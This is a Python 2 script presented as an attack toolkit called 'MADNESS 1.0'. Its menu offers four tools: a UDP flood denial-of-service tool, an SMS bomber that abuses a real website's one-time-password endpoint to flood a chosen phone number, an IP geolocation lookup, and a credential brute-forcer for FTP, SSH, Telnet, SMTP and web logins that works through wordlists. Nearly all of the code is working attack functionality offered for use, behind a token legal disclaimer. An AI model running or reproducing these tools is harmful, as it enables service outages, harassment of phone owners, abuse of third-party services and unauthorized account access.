# -*- coding: utf-8 -*-
import requests
import subprocess
import os
import json
import colorama
from colorama import init, Fore
import time
init(autoreset=True)
import sys
import socket
import threading
import logging
import random
import urllib2, cookielib
import random
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

logo = """
• ▌ ▄ ·.  ▄▄▄· ·▄▄▄▄   ▐ ▄ ▄▄▄ ..▄▄ · .▄▄ · 
·██ ▐███▪▐█ ▀█ ██▪ ██ •█▌▐█▀▄.▀·▐█ ▀. ▐█ ▀. 
▐█ ▌▐▌▐█·▄█▀▀█ ▐█· ▐█▌▐█▐▐▌▐▀▀▪▄▄▀▀▀█▄▄▀▀▀█▄
██ ██▌▐█▌▐█ ▪▐▌██. ██ ██▐█▌▐█▄▄▌▐█▄▪▐█▐█▄▪▐█
▀▀  █▪▀▀▀ ▀  ▀ ▀▀▀▀▀• ▀▀ █▪ ▀▀▀  ▀▀▀▀  ▀▀▀▀ 
"""

credits = """
MADNESS 1.0
Made by TWC [The Wrecking Crew]
Coded by Evos Madness.
"""

legal = """
Notice: It is your responsibility to suffer any leg-al consequences that may follow, by any causes of using this tool.
"""
FlameGRAVE = """
▄████  █    ██   █▀▄▀█ ▄███▄     
█▀   ▀ █    █ █  █ █ █ █▀   ▀    
█▀▀    █    █▄▄█ █ ▄ █ ██▄▄      
█      ███▄ █  █ █   █ █▄   ▄▀   
 █         ▀   █    █  ▀███▀     
  ▀           █    ▀             
             ▀                   
  ▄▀  █▄▄▄▄ ██       ▄   ▄███▄   
▄▀    █  ▄▀ █ █       █  █▀   ▀  
█ ▀▄  █▀▀▌  █▄▄█ █     █ ██▄▄    
█   █ █  █  █  █  █    █ █▄   ▄▀ 
 ███    █      █   █  █  ▀███▀   
       ▀      █     █▐           
             ▀      ▐            
"""
MadSpam = """
 ▄▀▀▄ ▄▀▄  ▄▀▀█▄   ▄▀▀█▄▄           
█  █ ▀  █ ▐ ▄▀ ▀▄ █ ▄▀   █          
▐  █    █   █▄▄▄█ ▐ █    █          
  █    █   ▄▀   █   █    █          
▄▀   ▄▀   █   ▄▀   ▄▀▄▄▄▄▀          
█    █    ▐   ▐   █     ▐           
▐    ▐            ▐                 
 ▄▀▀▀▀▄  ▄▀▀▄▀▀▀▄  ▄▀▀█▄   ▄▀▀▄ ▄▀▄ 
█ █   ▐ █   █   █ ▐ ▄▀ ▀▄ █  █ ▀  █ 
   ▀▄   ▐  █▀▀▀▀    █▄▄▄█ ▐  █    █ 
▀▄   █     █       ▄▀   █   █    █  
 █▀▀▀    ▄▀       █   ▄▀  ▄▀   ▄▀   
 ▐      █         ▐   ▐   █    █    
        ▐                 ▐    ▐    
"""
SCANNIT = """
   ▄▄▄▄▄   ▄█▄    ██      ▄      ▄   ▄█    ▄▄▄▄▀ 
  █     ▀▄ █▀ ▀▄  █ █      █      █  ██ ▀▀▀ █    
▄  ▀▀▀▀▄   █   ▀  █▄▄█ ██   █ ██   █ ██     █    
 ▀▄▄▄▄▀    █▄  ▄▀ █  █ █ █  █ █ █  █ ▐█    █     
           ▀███▀     █ █  █ █ █  █ █  ▐   ▀      
                    █  █   ██ █   ██             
                   ▀                             
"""
RedRipper = """
   /`-.   )\.---.     )\.-.                        
 ,' _  \ (   ,-._(  ,'     )                       
(  '-' (  \  '-,   (  .-, (                        
 ) ,_ .'   ) ,-`    ) '._\ )                       
(  ' ) \  (  ``-.  (  ,   (                        
 )/   )/   )..-.(   )/ ._.'                        
   /`-.  .'(     /`-.     /`-.   )\.---.     /`-.  
 ,' _  \ \  )  ,' _  \  ,' _  \ (   ,-._(  ,' _  \ 
(  '-' ( ) (  (  '-' ( (  '-' (  \  '-,   (  '-' ( 
 ) ,_ .' \  )  ) ,._.'  ) ,._.'   ) ,-`    ) ,_ .' 
(  ' ) \  ) \ (  '     (  '      (  ``-.  (  ' ) \ 
 )/   )/   )/  )/       )/        )..-.(   )/   )/ 
                                                   
"""
barrier = """
___________________________________________________
"""
while True:
    os.system("printf '\033]0;logo\007'")
    os.system("clear")
    print(Fore.RED + logo)
    print(Fore.RED + credits)
    print(Fore.BLUE + legal)
    print(Fore.RED + barrier)
    print(Fore.MAGENTA + "[1] FlameGRAVE DDos Tool")
    print(Fore.CYAN + "[2] MadSpam SMS Bomber")
    print(Fore.GREEN + "[3] SCANNIT IP Lookup")
    print(Fore.RED + "[4] RedRipper BRUTE-FORCE Tool-Kit")
    print("[0] Exit")
    print(Fore.RED + barrier)
    print(" ")
    x = raw_input(Fore.GREEN + "Option > ").strip()

    if x == "1":
        os.system("clear")
        print(Fore.MAGENTA + FlameGRAVE)
        server_ip = raw_input(Fore.RED + "Enter Target IP: ").strip()
        port = int(raw_input(Fore.RED + "Enter Target IP Port [1-65535]: ").strip())


        os.system("clear")
        print
        print(Fore.MAGENTA + FlameGRAVE)
        print(Fore.CYAN + barrier)
        print("\033[92m")
        print("________________ATTEMPTING TO FIND SERVER_____________________")
        time.sleep(3)
        print("_________________CONNECTING TO TARGET_______________________")
        time.sleep(3)
        print("__________________CHARGING FIREBALLS________________________")
        time.sleep(3)
        print(Fore.RED + "_________________TARGET IS GETTING SWARMED!________________________")
        time.sleep(3)
        print  
        print(Fore.MAGENTA + "SHOOTING FIREBALLS!. We hope you are using this for ethical purposes. Type Ctrl+C to suspend the attack.")
        time.sleep(2)
        socks = []
        for i in range(25):
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            socks.append(sock)
        bytes = random._urandom(1387)
        sent = 0
        try:
            while True:
                for sock in socks:
                       sock.sendto(bytes, (server_ip, port))
                       sent = sent + 1
                       port = port + 1
                       if port == 65535:
                           port = 1
                sys.stdout.write(Fore.RED + "Fireball %s shot to %s through port:%s\n" % (sent, server_ip, port))
                sys.stdout.flush()
        except KeyboardInterrupt:
            raw_input("\nAttack suspended. Press Enter to return to the menu...")

    if x == "2":
        os.system("clear")

        def send(num, counter, sleep):
            url = "https://www.quikr.com/SignIn?aj=1&for=send_otp&user="
            hdr = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11','Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3','Accept-Encoding': 'none','Accept-Language': 'en-US,en;q=0.8','Connection': 'keep-alive'}
            #data={"phone":num}
            result_url = url+num

            req = urllib2.Request(result_url, headers=hdr)
            for i in range(counter):
                try:
                    page = urllib2.urlopen(req)
                    print(Fore.MAGENTA + " Message sent! (Attempt {})".format(i+1))
                except urllib2.HTTPError as e:
                    print(" HTTP Error {}: {}".format(e.code, e.reason))
                except urllib2.URLError as e:
                    print("URL Error: {}".format(e.reason))
                time.sleep(sleep)

        try:
            print(Fore.CYAN + MadSpam)
            print(Fore.RED + barrier)
            number = raw_input(Fore.RED + "Enter Full Target Number [With CC]: ")
            count = raw_input(Fore.RED + "Enter number of SMS Messages: ")
            throttle = raw_input(Fore.RED + "Enter time interval: ")
            os.system("clear")
            print(Fore.CYAN + MadSpam)
            print(Fore.RED + barrier)
            print(Fore.MAGENTA + "_________________CONNECTING TO API_________________")
            time.sleep(3)
            print(" ")
            print(Fore.RED + " MAD SPAMMING STARTED! type Ctrl+C to suspend the SMS Bomber.")
            time.sleep(1)
            print(" ")
            send(number, int(count), int(throttle))
            raw_input(" Press Enter to return to menu...")
        except KeyboardInterrupt:
           raw_input("\nSpamming suspended. Press Enter to return to the menu...")
        finally:
            pass

    if x == "3":
        os.system("clear")
        print(Fore.GREEN + SCANNIT)
        print(Fore.RED + barrier)
        ip = raw_input(Fore.RED + "Enter Target IP address: ")
        time.sleep(1)
        os.system("clear")
        r = requests.get("http://ip-api.com/json/" + ip)
        data = r.json()
        print(Fore.GREEN + SCANNIT)
        print(Fore.RED + barrier)
        print(" ")
        print(Fore.RED + "_________________RESOLVING IP ADDRESS_________________")
        time.sleep(3)
        print(Fore.RED + "_________________SCANNING IP ADDRESS_________________")
        time.sleep(3)
        print(" ")
        print(Fore.GREEN + " IP ADDRESS SCANNED SUCCESSFULLY!")
        time.sleep(1)
        print(" ")
        print(Fore.BLUE + " Notice : Coordinates may not be 100% accurate to the exact Target's place.")
        print(" ")
        print (Fore.CYAN + " Country: " + data["country"])
        time.sleep(0.25)
        print (Fore.CYAN + " City: " + data["city"])
        time.sleep(0.25)
        print (Fore.CYAN + " Region: " + data["regionName"])
        time.sleep(0.25)
        print (Fore.CYAN + " Time Zone: " + data["timezone"])
        time.sleep(0.25)
        print (Fore.CYAN + " Coordinates [Latitude]: " + str(data["lat"]))
        time.sleep(0.25)
        print (Fore.CYAN + " Coordinates [Longitude]: " + str(data["lon"]))
        time.sleep(0.25)
        print (Fore.CYAN + " Internet company [ISP]: " + data["isp"])
        time.sleep(3)
        print(" ")
        raw_input(" Press Enter to return to menu...")

    if x == "4":
        os.system("clear")
        print(Fore.RED + RedRipper)
        print(Fore.RED + barrier)
        print(Fore.MAGENTA + "[1] FTP Attack")
        print(Fore.MAGENTA + "[2] SSH Attack")
        print(Fore.MAGENTA + "[3] Telnet Attack")
        print(Fore.MAGENTA + "[4] SMTP Attack")
        print(Fore.RED + "[5] Admin Panel or Login Brute Force")
        print("[6] Return\n")

        def load_list(value):
            value = value.strip()
            if not value:
                print("INVALID WORDLIST.")
                raw_input("Press Enter to return...")
                return []

            if os.path.isfile(value):
                if os.path.getsize(value) == 0:
                    print("Wordlist empty.")
                    sys.exit(1)

                try:
                    with open(value, "r") as f:
                        items = [line.strip() for line in f if line.strip()]
                    if not items:
                        print("Wordlist empty.")
                        sys.exit(1)
                    return items
                except:
                    print("Cannot read wordlist.")
                    sys.exit(1)

            return [value]

        def perform_ftp_attack(target_ip, ftp_port, user, passwd):
            ftp_commands = "user {} {}\nquit\n".format(user, passwd)
            proc = subprocess.Popen(['ftp', '-n', target_ip, str(ftp_port)],
                                    stdin=subprocess.PIPE,
                                    stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE)
            out, err = proc.communicate(ftp_commands)
            return proc.returncode

        def perform_ssh_attack(target_ip, ssh_port, user, passwd):
            ssh_command = [
                'sshpass', '-p', passwd,
                'ssh', '-o', 'StrictHostKeyChecking=no',
                '-p', str(ssh_port),
                '{}@{}'.format(user, target_ip)
            ]
            proc = subprocess.call(ssh_command)
            return proc

        def perform_telnet_attack(target_ip, telnet_port, user, passwd):
            telnet_command = ['telnet', target_ip, str(telnet_port)]
            proc = subprocess.Popen(telnet_command,
                                    stdin=subprocess.PIPE,
                                    stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE)
            time.sleep(1)
            try:
                proc.stdin.write("{}\n{}\n".format(user, passwd))
                proc.stdin.flush()
            except:
                pass
            proc.stdin.close()
            proc.wait()
            return proc.returncode

        def perform_smtp_attack(target_ip, smtp_port, user, passwd):
            smtp_command = [
                'swaks',
                '--to', user,
                '--from', user,
                '--server', target_ip,
                '--port', str(smtp_port),
                '--auth', 'LOGIN',
                '--auth-user', user,
                '--auth-password', passwd
            ]
            proc = subprocess.call(smtp_command)
            return proc

        def perform_web_attack():
            os.system("clear")
            print(Fore.RED + RedRipper)
            print(Fore.RED + barrier)
            print(Fore.MAGENTA + "           |WEB LOGIN CREDENTIAL RIPPER|\n")

            try:
                URL = raw_input(Fore.CYAN + "Enter Target URL: ").strip()
                VALID = raw_input(Fore.MAGENTA + "Enter Valid Username (leave empty to skip): ").strip()
                FIELD = raw_input(Fore.CYAN + "Enter Field Name: ").strip()
                WORDLIST = raw_input(Fore.CYAN + "Enter Username or Password Wordlist (.txt): ").strip()
                FAIL = raw_input(Fore.CYAN + "Enter Fail-String (invalid indicator): ").strip()
                OUTPUT = raw_input(Fore.CYAN + "Enter Output File (success.txt): ").strip()

                try:
                    words = open(WORDLIST, "r").read().splitlines()
                except Exception as e:
                    print(Fore.RED + "ERROR reading wordlist: {}".format(e))
                    raw_input("Press Enter...")
                    return

                print(Fore.MAGENTA + "\nRIPPING CREDENTIALS...\n")
                open(OUTPUT, "a").close()

                for user in words:
                    print(Fore.YELLOW + "Trying username: {}".format(user))

                    if VALID == "":
                        data = {FIELD: user}
                    else:
                        data = {
                            "username": VALID,
                            FIELD: user
                        }

                    try:
                        r = requests.post(URL, data=data, timeout=10)
                    except requests.exceptions.Timeout:
                        print(Fore.RED + "[ERROR] Timeout, skipping:", user)
                        continue
                    except requests.exceptions.ConnectionError:
                        print(Fore.RED + "[ERROR] Connection lost.")
                        raw_input("Press Enter...")
                        return
                    except Exception as e:
                        print(Fore.RED + "[ERROR] Unexpected:", e)
                        continue

                    if FAIL not in r.text:
                        print(Fore.GREEN + "\n[VALID USERNAME FOUND] -> " + user)
                        try:
                            with open(OUTPUT, "w") as out:
                                out.write(user + "\n")
                        except:
                            print(Fore.RED + "[ERROR] Cannot write output file.")
                        raw_input("\nPress Enter...")
                        return
                    else:
                        print(Fore.RED + "[INVALID] " + user)

                print(Fore.RED + "\nBruteforce complete. No valid username found.")
                raw_input("Press Enter...")

            except KeyboardInterrupt:
                print(Fore.YELLOW + "\nStopped by user.")
                raw_input("Press Enter...")
                return

        def perform_attack(target_type):
            os.system("clear")
            print(Fore.RED + RedRipper)
            print(Fore.RED + barrier)
            print(Fore.MAGENTA + "       |{} CREDENTIAL RIPPER|\n".format(target_type))

            target_ip = raw_input(Fore.RED + "Enter Target IP: ")
            target_port = raw_input(Fore.RED + "Enter {} Port: ".format(target_type))
            username_input = raw_input(Fore.CYAN + "Enter Username Wordlist: ")
            password_input = raw_input(Fore.CYAN + "Enter Password Wordlist: ")

            usernames = load_list(username_input)
            passwords = load_list(password_input)

            success_file = "{}_success_log.txt".format(target_type)
            open(success_file, "a").close()

            for user in usernames:
                for passwd in passwords:
                    if target_type == "FTP":
                        attack_command = lambda: perform_ftp_attack(target_ip, target_port, user, passwd)
                    elif target_type == "SSH":
                        attack_command = lambda: perform_ssh_attack(target_ip, target_port, user, passwd)
                    elif target_type == "Telnet":
                        attack_command = lambda: perform_telnet_attack(target_ip, target_port, user, passwd)
                    elif target_type == "SMTP":
                        attack_command = lambda: perform_smtp_attack(target_ip, target_port, user, passwd)
                    else:
                        print("Unknown target type.")
                        return

                    print("Trying {} - {} : {}".format(target_type, user, passwd))
                    retcode = attack_command()

                    if retcode == 0:
                        print(Fore.GREEN + "SUCCESS: {} {} {}".format(target_ip, user, passwd))
                        with open(success_file, "a") as sf:
                            sf.write("IP: {}, User: {}, Pass: {}\n".format(target_ip, user, passwd))
                        ex = raw_input("Exit or Continue? [E/C]: ").lower()
                        if ex == "e":
                            return
                    else:
                        print(Fore.RED + "FAILED: {} {}".format(user, passwd))

            raw_input("Press Enter...")

        choice = raw_input(Fore.GREEN + "Option > ")

        if choice == "1":
            perform_attack("FTP")
        elif choice == "2":
            perform_attack("SSH")
        elif choice == "3":
            perform_attack("Telnet")
        elif choice == "4":
            perform_attack("SMTP")
        elif choice == "5":
            perform_web_attack()
        elif choice == "6":
            raw_input("Press Enter to return...")
        else:
            raw_input("Invalid choice. Press Enter...")

    if x == "0":
        print("Exiting...")
        break

    if x not in ["0", "1", "2", "3", "4"]:
        print("Invalid option.")
        raw_input(" Press Enter to return to menu...")
